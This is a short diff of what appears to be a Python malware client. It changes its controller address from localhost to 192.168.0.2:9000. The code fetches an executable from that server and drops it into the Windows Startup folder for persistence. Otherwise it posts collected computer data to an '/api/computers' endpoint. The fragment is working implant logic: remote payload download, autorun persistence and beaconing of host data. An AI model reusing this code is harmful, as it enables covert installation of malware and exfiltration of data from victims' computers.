@@ -123,9 +123,9 @@ def Programs():
     return text
 
 if __name__ == '__main__':
-    version = requests.get('http://localhost:7777/api/version')
+    version = requests.get('http://192.168.0.2:9000/api/version')
     if (version.text != __version__):
-        app = requests.get(f'http://localhost:7777/api/tesla-{version.text}.exe')
+        app = requests.get(f'http://192.168.0.2:9000/api/tesla-{version.text}.exe')
         with open(f'{os.getenv("APPDATA")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\tesla-{version.text}.exe', 'wb')as file:
             file.write(app.content)
     else:
@@ -145,4 +145,4 @@ if __name__ == '__main__':
                             }
                 }
         headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
-        requests.post('http://localhost:7777/api/computers', data=json.dumps(data), headers=headers)
+        requests.post('http://192.168.0.2:9000/api/computers', data=json.dumps(data), headers=headers)
